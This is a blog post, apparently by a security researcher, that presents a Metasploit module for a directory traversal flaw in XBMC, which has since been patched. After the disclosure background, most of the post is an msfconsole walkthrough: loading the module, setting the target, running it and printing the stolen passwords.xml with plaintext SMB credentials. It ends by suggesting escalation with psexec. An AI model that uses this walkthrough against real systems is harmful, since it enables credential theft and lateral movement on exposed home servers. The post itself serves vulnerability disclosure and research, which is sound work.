---
layout: post
title: "XBMC Traversal Metasploit Module"
date: "2013-02-25T15:32:00-05:00"
comments: true
categories:
 - directorytraversal
 - metasploit
 - hacking
 - exploit
---

## Background

I was talking in [Intern0t](irc://chat.freenode.net:6667/intern0t) several months ago. [AcidGen](https://twitter.com/Acidgen), from [IOActive](http://www.ioactive.com) mentioned that he found a bug in [XBMC](http://www.xbmc.org). I use [XBMC](http://www.xbmc.org) quite a bit at home, on various platforms, since it's extremely wife-friendly. I hit him up, and we started talking. We had a nice Skype conversation, where we discussed possible platforms that were affected, and future exploits that we'd like to find. Since I had a jailbroken [Apple TV 2](https://www.apple.com/appletv) and [RaspberryPi](http://www.raspberrypi.org), I told him that I could test those platforms and help out. 

<!-- more -->

An [official disclosure](http://www.ioactive.com/pdfs/Security_Advisory_XBMC.pdf) was released, detailing the directory traversal vulnerability. The [XBMC](http://www.xbmc.org) team was able to make a [fix](https://github.com/xbmc/xbmc/commit/bdff099c024521941cb0956fe01d99ab52a65335), and the new version 12 is not vulnerable.

## Why does this vulnerability matter?

When talking with the [XBMC](http://www.xbmc.org), they seemed to play off the vulnerability, because they believed nobody would ever expose this service to a public network. However, a quick [ShodanHQ](http://www.shodanhq.com/search?q=xbmc) search shows that people are exposing it. But you may say, "Matt, this is only a directory traversal vulnerability, what are you going to do, steal someone's MP3s?". The issue here, lies in that if you can read any file on the system, that may include password files, such as /etc/passwd or even /etc/shadow if the service runs as root. What makes this even worse, is that due to how XBMC has to pass credentials to a fileserver, it stores the credentials in plain text. This gives an attacker a <i>huge</i> advantage. They now have valid credentials on at least one system. If the system has SMB exposed as well, it could easily be game-over.

## Let's see the exploit...

I don't know why it took so long, but I finally finished the MSF module for this vulnerability. It can be found [here](https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/gather/xbmc_traversal.rb). The usage is pretty simple. Here is a sample exploitation against an [Apple TV 2](https://www.apple.com/appletv).

As usual, watch the pretty ASCII-art go by, and use the module. 

```
420-1572-man:gather mandreko$ msfconsole
     ,           ,
    /             \
   ((__---,,,---__))
      (_) O O (_)_________
         \ _ /            |\
          o_o \   M S F   | \
               \   _____  |  *
                |||   WW|||
                |||     |||


       =[ metasploit v4.6.0-dev [core:4.6 api:1.0]
+ -- --=[ 1048 exploits - 590 auxiliary - 174 post
+ -- --=[ 275 payloads - 28 encoders - 8 nops

msf > use auxiliary/gather/xbmc_traversal
msf  auxiliary(xbmc_traversal) >
</pre>Check out the options. You'll see the username and password that need to be set (however it's often defaulted to "xbmc", as well as the host, and file to disclose. 
<pre>msf  auxiliary(xbmc_traversal) > show options

Module options (auxiliary/gather/xbmc_traversal):

   Name      Current Setting                                                      Required  Description
   ----      ---------------                                                      --------  -----------
   DEPTH     9                                                                    yes       The max traversal depth
   FILEPATH  /private/var/mobile/Library/Preferences/XBMC/userdata/passwords.xml  no        The name of the file to download
   PASSWORD  xbmc                                                                 yes       The password to use for the HTTP server
   Proxies                                                                        no        Use a proxy chain
   RHOST                                                                          yes       The target address
   RPORT     8080                                                                 yes       The target port
   USERNAME  xbmc                                                                 yes       The username to use for the HTTP server
   VHOST                                                                          no        HTTP server virtual host

msf  auxiliary(xbmc_traversal) >
```

Go ahead and set the RHOST to the XBMC server. 

```
msf  auxiliary(xbmc_traversal) > set rhost 192.168.1.102
rhost => 192.168.1.102
msf  auxiliary(xbmc_traversal) >
```

Lastly, run the exploit 

```
msf  auxiliary(xbmc_traversal) > run

[+] File saved in: /Users/mandreko/.msf4/loot/20130223100731_default_192.168.1.102_xbmc.http_604967.xml
[*] Auxiliary module execution completed
msf  auxiliary(xbmc_traversal) >
```

You can see this was successful. It saved the file locally, and added notes in [Metasploit](http://www.metasploit.com). Just to verify the findings, you can read the file it saved. 

```
msf  auxiliary(xbmc_traversal) > cat /Users/mandreko/.msf4/loot/20130223100731_default_192.168.1.102_xbmc.http_604967.xml
```

```
[*] exec: cat /Users/mandreko/.msf4/loot/20130223100731_default_192.168.1.102_xbmc.http_604967.xml

<passwords>
    <path>
        <from pathversion="1">smb://192.168.1.2/Movies</from>
        <to pathversion="1">smb://xbmc:xbmc@192.168.1.2/Movies/</to>
    </path>
    <path>
        <from pathversion="1">smb://192.168.1.2/tv</from>
        <to pathversion="1">smb://xbmc:xbmc@192.168.1.2/tv/</to>
    </path>
    <path>
        <from pathversion="1">smb://192.168.1.2/Music</from>
        <to pathversion="1">smb://xbmc:xbmc@192.168.1.2/Music/</to>
    </path>
</passwords>
msf  auxiliary(xbmc_traversal) >
```

And there you have it. You now have valid credentials on that fileserver. You could start escalating with psexec or other methods. Half the battle is already over.
